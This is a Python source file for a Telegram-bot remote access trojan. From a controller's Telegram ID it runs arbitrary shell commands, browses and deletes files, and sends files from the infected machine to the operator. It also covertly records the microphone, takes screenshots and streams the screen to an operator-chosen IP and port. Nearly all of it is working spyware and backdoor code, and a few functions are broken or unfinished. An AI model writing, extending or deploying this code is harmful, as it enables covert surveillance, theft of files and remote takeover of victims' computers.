import subprocess
import pyautogui
import pyaudio
import socket
import pickle
import struct
import time
import wave
import cv2
import os

import numpy as np

from telebot import TeleBot
from telebot.types import KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from PIL import Image
import moviepy.editor as moviepy

# Variables


API_TOKEN = <token>
ADMIN = <id>

filename_audio = "recorded_audio.wav"
filename_video = "recorded_video.avi"
filename_video2 = "recorded_video2.avi"
filename_screenshot = "screenshot.jpg"

SREEN_SIZE = (1920, 1080)
fourcc = cv2.VideoWriter_fourcc(*"XVID")
start = True

chunk = 2048
FORMAT = pyaudio.paInt16
channels = 1
sample_rate = 44100

bot = TeleBot(API_TOKEN)

markup = ReplyKeyboardMarkup(True, True)
markup.add(KeyboardButton("cd"), KeyboardButton("cd_path"),
           KeyboardButton("dir"), KeyboardButton("del"),
           KeyboardButton("type"), KeyboardButton("get_file"),
           KeyboardButton("exec_cmd"), KeyboardButton("record_audio"),
           KeyboardButton("dump_audio"), KeyboardButton("record_video"),
           KeyboardButton("avi_to_mp4"), KeyboardButton("screenshot"),
           KeyboardButton("screen_broadcast"))


# Fn(1)
def create_markup(markup):
    list_files = os.listdir(os.getcwd())
    for i in list_files:
        markup.add(i)
        
    markup.add("None")

def recordAUDIO(time=6):
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=channels,
                    rate=sample_rate,
                    input=True,
                    output=True,
                    frames_per_buffer=chunk)
    
    frames = []
    for i in range(int(sample_rate / chunk * time)):
        data = stream.read(chunk)
        frames.append(data)

        with open('dump_record_audio.dat', 'wb') as dump_out:
            pickle.dump(frames, dump_out, protocol=3)

    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(filename_audio, "wb")
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(sample_rate)

    wf.writeframes(b"".join(frames))
    
    wf.close()

def checkID(ms):
    if ms.from_user.id == ADMIN:
        return True
    else:
        info = f"""
        Name - {ms.from_user.first_name}
        Surname - {ms.from_user.last_name}
        UserName - {ms.from_user.username}
        Language - {ms.from_user.language_code}
        """
        bot.send_message(ADMIN, "USED:")
        bot.send_message(ADMIN, info)
        return False


# Fn(2)
def cd():
    output = os.getcwd()
    bot.send_message(ADMIN, output, reply_markup=markup)

def cd_path(ms):
    markup_cd = ReplyKeyboardMarkup()
    create_markup(markup_cd)
    markup_cd.add("..")
    bot.send_message(ADMIN, "Enter path...", reply_markup=markup_cd)
    
    @bot.message_handler(content_types=["text"])
    def exec_cd_path_next(ms):
        if ms.text != "None":
            try:
                path = ms.text
                os.chdir(path)
                output = os.getcwd()
                bot.send_message(ADMIN, output)
            except Exception as e:
                bot.send_message(ADMIN, f"Error:\n{e}")
                
        bot.send_message(ADMIN, "ㅤ", reply_markup=ReplyKeyboardRemove())
        bot.send_message(ADMIN, "ㅤ", reply_markup=markup)

    bot.register_next_step_handler(ms, exec_cd_path_next)

def dir():
    try:
        list_files = os.listdir(os.getcwd())
        output = ""
        for i in list_files:
            output += f"{i}\n"
        
        if output:
            bot.send_message(ADMIN, output, reply_markup=markup)
        else:
            bot.send_message(ADMIN, "<Empty>", reply_markup=markup)
    except Exception as e:
        bot.send_message(ADMIN, f"Error:\n{e}")

def del_file(ms):
    markup_del = ReplyKeyboardMarkup()
    create_markup(markup_del)
    bot.send_message(ADMIN, "Enter path...", reply_markup=markup_del)

    @bot.message_handler(content_types=["text"])
    def del_file_next(ms):
        if ms.text != "None":
            try:
                path_file = ms.text
                os.remove(path_file)
                bot.send_message(ADMIN, "File removed ✅")
            except Exception as e:
                bot.send_message(ADMIN, f"Error:\n{e}")

        bot.send_message(ADMIN, "ㅤ", reply_markup=ReplyKeyboardRemove())
        bot.send_message(ADMIN, "ㅤ", reply_markup=markup)

    bot.register_next_step_handler(ms, del_file_next)

def type(ms):
    markup_type = ReplyKeyboardMarkup()
    create_markup(markup_type)
    bot.send_message(ADMIN, "Enter path...", reply_markup=markup_type)
    
    @bot.message_handler(content_types=["text"])
    def exec_type_next(ms):
        if ms.text != "None":
            try:
                path = ms.text
                output = subprocess.check_output(f"type {path}", shell=True).decode("utf-8")
                if output:
                    bot.send_message(ADMIN, output)
                else:
                    bot.send_message(ADMIN, "<Empty>")
            except Exception as e:
                bot.send_message(ADMIN, f"Error:\n{e}")
                
        bot.send_message(ADMIN, "ㅤ", reply_markup=ReplyKeyboardRemove())
        bot.send_message(ADMIN, "ㅤ", reply_markup=markup)

    bot.register_next_step_handler(ms, exec_type_next)

def get_file(ms):
    markup_file = ReplyKeyboardMarkup()
    create_markup(markup_file)
    bot.send_message(ADMIN, "Enter path...", reply_markup=markup_file)
    
    @bot.message_handler(content_types=["text"])
    def get_file_next(ms):
        if ms.text != "None":
            try:
                path = ms.text
                bot.send_document(ADMIN, open(path, "rb"))
            except Exception as e:
                bot.send_message(ADMIN, f"Error:\n{e}")

        bot.send_message(ADMIN, "ㅤ", reply_markup=ReplyKeyboardRemove())
        bot.send_message(ADMIN, "ㅤ", reply_markup=markup)

    bot.register_next_step_handler(ms, get_file_next)

def exec_cmd(ms):
    bot.send_message(ADMIN, "Enter command...")

    @bot.message_handler(content_types=["text"])
    def exec_cmd_next(ms):
        try:
            cmd = ms.text
            output = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = output.stdout + output.stderr
            if output:
                bot.send_message(ADMIN, output, reply_markup=markup)
            else:
                bot.send_message(ADMIN, "Empty", reply_markup=markup)
        except Exception as e:
            bot.send_message(ADMIN, f"Error:\n{e}")

    bot.register_next_step_handler(ms, exec_cmd_next)

def record_audio(ms):
        bot.send_message(ADMIN, "Enter time, quantity iteration...", reply_markup=markup)
        
        @bot.message_handler(content_types=["text"])
        def record_audio_next(ms):
            try:
                list_data = ms.text.split(" ")
                time = int(list_data[0])
                quantity = int(list_data[1])
                bot.send_message(ADMIN, "Recording 🎲")
                
                for i in range(quantity):
                    recordAUDIO(time)
                    with open(filename_audio, 'rb') as audio:
                        bot.send_audio(ADMIN, audio)
                
                os.remove(filename_audio)
                bot.send_message(ADMIN, "Finished recording ✅")
            except Exception as e:
                bot.send_message(ADMIN, f"Error:\n{e}")

        bot.register_next_step_handler(ms, record_audio_next)

def dump_audio():
    with open("dump_record_audio.dat", "rb") as dump_in:
        unpickler = pickle.Unpickler(dump_in)
        frame = unpickler.load()

        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT,
                        channels=channels,
                        rate=sample_rate,
                        input=True,
                        output=True,
                        frames_per_buffer=chunk)
        
        wf = wave.open(filename_audio, "wb")
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(sample_rate)
        wf.writeframes(b"".join(frame))
        wf.close()
        
        bot.send_message(ADMIN, "Unpacked ✅", reply_markup=markup)
        
        with open(filename_audio, "rb") as audio:
            bot.send_audio(ADMIN, audio)
        
        os.remove(filename_audio)

def record_video(ms):
    bot.send_message(ADMIN, "Recording 🎲", reply_markup=markup)
    out = cv2.VideoWriter(filename=filename_video, fourcc=fourcc, fps=15.0, frameSize=(SREEN_SIZE))
    
    while True:
        image = pyautogui.screenshot()
        image = np.array(image)
        
        frame = image
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)

    bot.send_message(ADMIN, "Finished ✅")
    cv2.destroyAllWindows()
    out.release()

def avi_to_mp4(ms):
    """
    Получение всех элементов в список, дальнейшая конвертация
    всем элементов с списке по именам и отправка в тг
    """
    
    # bot.send_message(ADMIN, "convert to mp4...")

    # ...

    # clip = moviepy.VideoFileClip(filename_video)
    # clip.write_videofile("recorded.mp4", logger=None)
    
    # os.remove(filename_video)
    
    # with open("recorded.mp4", "rb") as video:
    #     bot.send_message(ADMIN, "Success ✅")
    #     bot.send_video(ADMIN, video)

    # os.remove("recorded.mp4")

def screenshot():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save("screenshot.jpg")

    with open(filename_screenshot, "rb") as photo:
        bot.send_photo(ADMIN, photo, reply_markup=markup)
    
    os.remove(filename_screenshot)

def screen_broadcast(ms):
    bot.send_message(ADMIN, "Enter port, ip...")
    
    @bot.message_handler(content_types=["text"])
    def screen_broadcast_next(ms):
        try:
            list_data = ms.text.split()
            PORT = int(list_data[0])
            IP = list_data[1]

            clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            while True:
                try:
                    bot.send_message(ADMIN, "Connection attempt 🎲")
                    clientsocket.connect((IP, PORT))
                    break
                except Exception as e:
                    bot.send_message(ADMIN, "Сonnection error ❌")
                    time.sleep(10)

            bot.send_message(ADMIN, "Successful connection ✅")
            while True:
                image = pyautogui.screenshot()
                image = image.resize((1024, 576))
                image = np.array(image)
                img = Image.frombytes('RGB', (1024, 576), image)
                data = pickle.dumps(np.array(img))
                clientsocket.sendall(struct.pack("L", len(data)) + data)
        except Exception as e:
            bot.send_message(ADMIN, f"Error:\n{e}")
    
    bot.register_next_step_handler(ms, screen_broadcast_next)


# Start
@bot.message_handler(commands=["_start", "_help"])
def send_welcome(ms):
    if checkID(ms):
        bot.send_message(ADMIN, text="ㅤ", reply_markup=markup)


@bot.message_handler(content_types=["text"])
def CheckCommand(ms):
    if checkID(ms):
        if ms.text == "cd":
            cd()

        elif ms.text == "cd_path":
            cd_path(ms)

        elif ms.text == "dir":
            dir()

        elif ms.text == "del":
            del_file(ms)
        
        elif ms.text == "type":
            type(ms)
        
        elif ms.text == "get_file":
            get_file(ms)

        elif ms.text == "exec_cmd":
            exec_cmd(ms)

        elif ms.text == "record_audio":
            record_audio(ms)

        elif ms.text == "dump_audio":
            dump_audio()

        elif ms.text == "record_video":
            record_video(ms)
        
        elif ms.text == "avi_to_mp4":
            avi_to_mp4(ms)

        elif ms.text == "screenshot":
            screenshot()

        elif ms.text == "screen_broadcast":
            screen_broadcast(ms)


bot.infinity_polling()